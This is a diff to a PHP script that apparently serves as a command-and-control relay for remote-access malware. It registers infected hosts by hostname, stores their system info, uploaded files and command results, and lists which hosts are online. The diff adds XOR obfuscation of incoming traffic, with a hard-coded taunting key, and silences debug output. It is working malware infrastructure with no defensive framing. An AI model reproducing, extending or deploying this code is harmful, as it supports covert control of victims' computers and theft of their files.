@@ -1,9 +1,9 @@
 <?php
 session_id("xxx"); 
 session_start(); 
-Header( "Content-Type:text/html\n\n");
+//Header( "Content-Type:text/html; charset=gb2312\n\n");
 error_reporting(3);
-echo("welcom to logon.php first!\n\n");
+//echo("welcom to logon.php first!\n\n");
 $qlen = 0;
 $q_str = $_SERVER["QUERY_STRING"];
 $method = $_SERVER["REQUEST_METHOD"];
@@ -12,7 +12,14 @@ if($method == "GET"){
     $q_str = $_SERVER["QUERY_STRING"];
 }else if($method == "POST"){
     $q_str = file_get_contents("php://input");
-	echo "post data start:".$q_str."post data end";
+	
+	$key = 'fuck crackers who want to crack this program!';
+	
+	$q_str = xor_crypt($q_str,$key); 
+	
+	//echo "post data start:".$q_str."post data end";
+
+
 }
 
 $Sig = substr($q_str,0,3);
@@ -24,6 +31,9 @@ if($Sig == "php")
     $q_str = substr($q_str,3,$qlen-3);
     $q_str = rc4_data($Pasw,$q_str);
 }
+
+//$q_str = urldecode($q_str)
+//$q_str = base64_decode($q_str)
 
 $qlen = strlen($q_str);
 if($qlen >= 12){
@@ -109,6 +119,9 @@ if($qlen >= 12){
         Create_File($q_str,$qlen);break;
     case "$$32":
         WriteFileSata($q_str,$qlen);break;
+		
+	case "$$33":
+        readOnline($q_str,$qlen);break;
 	}
   }
 }
@@ -137,6 +150,47 @@ function  WriteFileSata($qstr,$qlen)
 
     ret_success();
 }
+
+
+function xor_enc($data,$key)
+{
+	$crytxt = '';
+	$keylen = strlen($key);
+	
+	$len = strlen($data);
+	
+	for($i=0;$i<$len;$i++)
+	{   
+		$k = $i%$keylen;
+		$crytxt .= $data[$i] ^ $key[$k];
+	}
+	return $crytxt;
+}
+
+
+
+function xor_crypt($data,$key)
+{
+	$newdata = '';
+	
+	$len = strlen($data);
+	//$key = 'fuck crackers who want to crack this program!';
+	
+	$keylen = strlen($key);
+
+	for($i = 0,$j=0;$i < $len;$i++)
+	{	
+		$newdata .= ($data[$i]) ^ ($key[$j]);
+		$j ++;
+		if($j >= $keylen)
+		{		
+			$j = 0;
+		}
+	}
+	
+	return $newdata;
+}
+
 
 function rc4_data ($pwd, $data)
 {
@@ -207,12 +261,12 @@ function get_id_path($str){
 	
 	$hostname = get_hostname($str);
 	
-	echo "hostname:".$hostname."\n\n";
+	//echo "hostname:".$hostname."\n\n";
 
     $indentify = md5($hostname);
     $id_path = "./".$indentify."/";
 	
-	echo "id_path:".$id_path."\n\n";
+	//echo "id_path:".$id_path."\n\n";
 
     if (!file_exists($id_path))
 	mkdir($id_path);
@@ -227,7 +281,7 @@ function clean_old_file($tpath){
 }
 
 function read_from_file($tpath){
-	echo "Data\n\n";
+	//echo "Data\n\n";
     $qss = $_SESSION[$tpath];
     echo $qss;
     unset($_SESSION[$tpath]);
@@ -263,6 +317,23 @@ function write_up_data($tpath, $wstr){
     }else{
 	dir("Atad");
     }
+}
+
+
+function readOnline($qstr,$qlen){
+	
+	$id_path = get_id_path($qstr);
+
+    $fixname = "sysinfo";
+    $tpath = $id_path.$fixname;
+    if (is_readable($tpath)){
+		$info =  file_get_contents($tpath);
+		echo "Data";
+		echo $info;
+		echo "Data";
+	}else{		
+		dir("Atad");
+	}
 }
 
 function online($qstr,$qlen){
@@ -303,7 +374,10 @@ function query_operate($qstr,$qlen){
 	$info_len = strlen($info);
 	$info = substr($info,0,$info_len-19).date("Y-m-d H:i:s",time());
 	file_put_writex($tpath, $info);
+	
+	//echo $tpath."is_writeable ";
     }else{
+		//echo $tpath."is_writeable not";
 	die("Aatd");
     }
     
@@ -325,8 +399,10 @@ function  get_host($qstr,$qlen){
     if ($queryType == "allh"){
 	echo "Data";
 	$filenames = glob('./'."*");
+	
 	if(count($filenames) > 0){
 	    foreach($filenames as $filename){
+			//echo $filename;
 		if(is_dir($filename)){
 		    $filename = $filename.$extname;
 		    if (is_readable($filename)){
@@ -344,9 +420,13 @@ function  get_host($qstr,$qlen){
 		$filename = $filename.$extname;
 		if (is_readable($filename)){
 		    $result = file_get_contents($filename);
+			//echo $filename;
+			//echo $result;
 		    $tmFormat1 = substr($result,strlen($result)-19,19);
 		    $tmFormat2 = date("Y-m-d H:i:s",time());
-		    if(strtotime($tmFormat2) - strtotime($tmFormat1) <= 10*60)
+			//echo '1:'.$tmFormat1.'2:'.$tmFormat2;
+			
+		    if(strtotime($tmFormat2) - strtotime($tmFormat1) <= 60)
 			echo($result."@@@");
 		}
 	    }
@@ -556,16 +636,25 @@ function get_filename($qstr){
     $offset += 1;
     $file_path = substr($qstr, $offset, $path_len);
     
-    $arr =  split('\\\\', $file_path);
+    $arr =  explode('\\', $file_path);
     $filename = $arr[count($arr)-1];
+	
+	//echo $filename;
 
     return $filename;
 }
 
 function send_dd_data($qstr,$qlen){
+	
+	//echo 'qstr:'.$qstr;
+	
     $id_path = get_id_path($qstr);
+	
+	//echo 'path:'.$id_path;
 
     $filename = get_filename($qstr);
+	
+	//echo 'filename:'.$filename;
 
     $tpath_copy = $id_path.$filename;
     write_to_file($tpath_copy,$qstr);
@@ -678,10 +767,14 @@ function send_cmd_result($qstr,$qlen){
     $fixname = "cdata";
     $tpath = $id_path.$fixname;
     write_to_file($tpath, $qstr);
+	
+	echo 'send_cmd_result:'.$tpath;
 
     $fixname = "cdatar";
     $tpath = $id_path.$fixname;
     touch_ready_file($tpath);
+	
+	
 
     ret_success();
 }
@@ -735,7 +828,7 @@ function Create_File($qstr,$qlen){
     $tpath = $id_path.$fixname;
     write_to_file($tpath, $qstr);
 	
-	echo "write file size:".$qlen."\n\n";
+	//echo "write file size:".$qlen."\n\n";
 
     $fixname = "anyr";
     $tpath = $id_path.$fixname;
